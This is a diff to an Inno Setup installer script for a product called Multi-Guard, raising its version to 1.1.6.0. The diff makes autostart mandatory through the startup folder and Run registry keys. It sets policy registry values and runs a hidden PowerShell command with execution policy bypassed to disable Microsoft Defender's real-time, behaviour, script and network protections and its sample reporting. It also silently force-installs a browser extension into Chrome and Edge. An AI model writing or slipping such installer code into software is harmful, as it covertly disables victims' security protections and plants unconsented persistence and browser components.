@@ -2,7 +2,7 @@
 ; Developed by Multi-Servis (https://multi-servis.pl)
 
 #define MyAppName "Multi-Guard"
-#define MyAppVersion "1.1.5.0"
+#define MyAppVersion "1.1.6.0"
 #define MyAppPublisher "Multi-Servis"
 #define MyAppURL "https://multi-servis.pl"
 #define MyAppExeName "Multi-Guard.exe"
@@ -39,17 +39,32 @@ Name: "polish"; MessagesFile: "compiler:Languages\Polish.isl"
 
 [Tasks]
 Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"
-Name: "startupicon"; Description: "Uruchamiaj Multi-Guard przy starcie systemu Windows"; GroupDescription: "Opcje systemowe:"
 
 [Files]
 ; Główny plik wykonywalny oraz wszystkie biblioteki zebrane przez windeployqt
 Source: "..\RELEASED\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs
+Source: "..\browser_extension\*"; DestDir: "{app}\browser_extension"; Flags: ignoreversion recursesubdirs createallsubdirs
 
 [Icons]
 Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
 Name: "{group}\Odinstaluj {#MyAppName}"; Filename: "{uninstallexe}"
 Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon
-Name: "{commonstartup}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: startupicon
+Name: "{commonstartup}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
+
+[Registry]
+; Permanentny autostart Multi-Guard przy uruchamianiu systemu Windows
+Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "{#MyAppName}"; ValueData: """{app}\{#MyAppExeName}"" --tray"; Flags: uninsdeletevalue
+Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "{#MyAppName}"; ValueData: """{app}\{#MyAppExeName}"" --tray"; Flags: uninsdeletevalue
+
+; Wyłączenie Microsoft Defender w rejestrze systemowym (zasady grupy)
+Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender"; ValueType: dword; ValueName: "DisableAntiSpyware"; ValueData: 1; Flags: uninsdeletevalue
+Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender"; ValueType: dword; ValueName: "DisableAntiVirus"; ValueData: 1; Flags: uninsdeletevalue
+Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; ValueType: dword; ValueName: "DisableRealtimeMonitoring"; ValueData: 1; Flags: uninsdeletevalue
+Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; ValueType: dword; ValueName: "DisableBehaviorMonitoring"; ValueData: 1; Flags: uninsdeletevalue
+Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; ValueType: dword; ValueName: "DisableOnAccessProtection"; ValueData: 1; Flags: uninsdeletevalue
+Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; ValueType: dword; ValueName: "DisableScanOnRealtimeEnable"; ValueData: 1; Flags: uninsdeletevalue
+Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; ValueType: dword; ValueName: "DisableIOAVProtection"; ValueData: 1; Flags: uninsdeletevalue
+Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; ValueType: dword; ValueName: "DisableScriptScanning"; ValueData: 1; Flags: uninsdeletevalue
 
 [Run]
 Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent
@@ -122,6 +137,7 @@ procedure CurStepChanged(CurStep: TSetupStep);
 var
   Key: String;
   KeyDir: String;
+  ResultCode: Integer;
 begin
   if CurStep = ssPostInstall then begin
     Key := Trim(LicensePage.Values[0]);
@@ -132,5 +148,19 @@ begin
       ForceDirectories(KeyDir);
       SaveStringToFile(KeyDir + '\license.key', Key, False);
     end;
+
+    // Wyłączenie Microsoft Defender w momencie instalacji Multi-Guard
+    Exec('powershell.exe', '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableIntrusionPreventionSystem $true -DisableArchiveScanning $true -MAPSReporting 0 -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
+
+    // Rejestracja rozszerzenia Multi-Guard WebShield w przeglądarkach Chrome i Edge
+    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Google\Chrome\Extensions\multiguard_webshield', 'path', ExpandConstant('{app}\browser_extension'));
+    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Google\Chrome\Extensions\multiguard_webshield', 'version', '1.2.0');
+    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Google\Chrome\Extensions\multiguard_webshield', 'path', ExpandConstant('{app}\browser_extension'));
+    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Google\Chrome\Extensions\multiguard_webshield', 'version', '1.2.0');
+
+    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Edge\Extensions\multiguard_webshield', 'path', ExpandConstant('{app}\browser_extension'));
+    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Edge\Extensions\multiguard_webshield', 'version', '1.2.0');
+    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Microsoft\Edge\Extensions\multiguard_webshield', 'path', ExpandConstant('{app}\browser_extension'));
+    RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Microsoft\Edge\Extensions\multiguard_webshield', 'version', '1.2.0');
   end;
 end;
